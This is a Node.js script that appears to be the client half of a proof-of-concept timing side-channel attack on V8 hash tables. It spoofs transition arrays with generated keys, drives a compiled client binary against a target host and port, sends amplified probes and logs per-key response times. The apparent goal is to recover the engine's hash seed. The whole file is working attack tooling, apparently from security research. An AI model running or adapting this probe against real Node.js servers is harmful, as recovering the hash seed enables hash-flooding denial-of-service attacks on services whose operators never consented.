'use strict';

// Needs to be run with --hash_seed=1 and node compiled --without-snapshot
const SEED = 1;
const AMPLIFICATION = 4096;
const SPOOF_COUNT = 1024 + 512;
const KEY_COUNT = 1;
const EXTRACT_COUNT = 1024;

const PORT = (process.argv[2] || 8000) | 0;
const HOST = process.argv[3] || '127.0.0.1';

const async = require('async');
const path = require('path');
const spawn = require('child_process').spawn;
const util = require('util');

const BINARY = path.join(__dirname, '..', 'out/Release/client');

const common = require('./common');
const hash = common.createHash(SEED);
const findPos = common.findPos;
const hashToStr = common.hashToStr;

// (global) DescriptorLookupCache::kLength = 64
// DescriptorArray::kMaxNumberOfDescriptors = 2**10 - 2 = 1022
// TransitionArray::kMaxNumberOfTransitions = 1024 + 512

let offset = (Math.random() * 0xffffffff) >>> 0;

function genKey() {
  return common.key(offset++);
}

function Client(port, host) {
  this.port = port;
  this.host = host;

  this.proc = null;
  this.pending = [];

  // Spoof TransitionArray
  const spoof = [];
  for (let i = 0; i < SPOOF_COUNT; i++)
    spoof.push(genKey());
  this.spoof = spoof;

  this.respawn();
}

Client.prototype.respawn = function respawn() {
  this.proc = spawn(BINARY, [ this.port, this.host ], {
    stdio: [ 'pipe', 'pipe', 'inherit' ]
  });
  this.proc.on('exit', () => {
    this.proc = null;
    this.respawn();
  });

  let buffer = '';
  this.proc.stdout.on('data', (chunk) => {
    buffer += chunk;
    const split = buffer.split(/\n/g);
    if (split.length === 1)
      return;

    buffer = split.slice(1).join('\n');

    const pending = this.pending.shift();
    if (!pending)
      return;

    pending.callback(null, parseFloat(split[0]));

    if (this.pending.length !== 0)
      this._sendPending();
  });

  if (this.pending.length !== 0)
    this._sendPending();
};

Client.prototype._sendPending = function _sendPending() {
  this.proc.stdin.write(this.pending[0].input);
};

Client.prototype.request = function request(body, callback) {
  this.pending.push({
    input: body + '\n',
    callback
  });
  if (this.pending.length === 1)
    this._sendPending();
};

Client.prototype.runProbe = function runProbe(keys, otherKey, callback) {
  const probe = common.getProbe(this.spoof, keys, otherKey, AMPLIFICATION);

  this.request(probe, callback);
};

Client.prototype.run = function run(callback) {
  const key = genKey();
  console.error(common.hashToStr(hash(key)));

  const timings = [];

  let i = 0;
  async.whilst(() => {
    return i++ < EXTRACT_COUNT;
  }, (callback) => {
    const otherKey = genKey();
    this.runProbe([ key ], otherKey, (err, time) => {
      if (!err)
        timings.push({ key: otherKey, time: time });
      callback(err);
    });
  }, (err) => {
    callback(err, timings);
  });
};

Client.prototype.exit = function exit() {
  this.proc.kill();
};

const c = new Client(PORT, HOST);

c.run((err, timings) => {
  timings.forEach((item) => {
    console.log(item.key + ',' + item.time);
  });
  c.exit();
});
